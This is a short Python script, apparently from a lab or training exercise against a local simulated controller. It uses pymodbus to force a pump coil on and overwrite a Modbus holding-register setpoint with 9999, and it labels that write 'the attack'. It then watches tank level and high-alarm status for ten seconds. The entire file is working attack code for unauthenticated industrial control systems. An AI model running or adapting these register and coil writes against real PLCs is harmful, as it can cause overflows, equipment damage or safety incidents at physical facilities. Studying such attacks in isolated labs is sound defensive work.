import time
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("127.0.0.1", port=502)
client.connect()

client.write_coil(2, True, device_id=1)          # ensure pump is running
client.write_register(1, 9999, device_id=1)      # FC6: Setpoint = 9999  <-- the attack
print("ATTACK: Setpoint overwritten to 9999\n")

for _ in range(10):
    regs  = client.read_holding_registers(0, count=2, device_id=1)
    coils = client.read_coils(0, count=3, device_id=1)
    level, setpoint = regs.registers
    pump, alarm = coils.bits[0], coils.bits[1]
    print(f"Level={level:3}  Setpoint={setpoint}  Pump={pump}  HighAlarm={alarm}")
    time.sleep(1)

client.close()
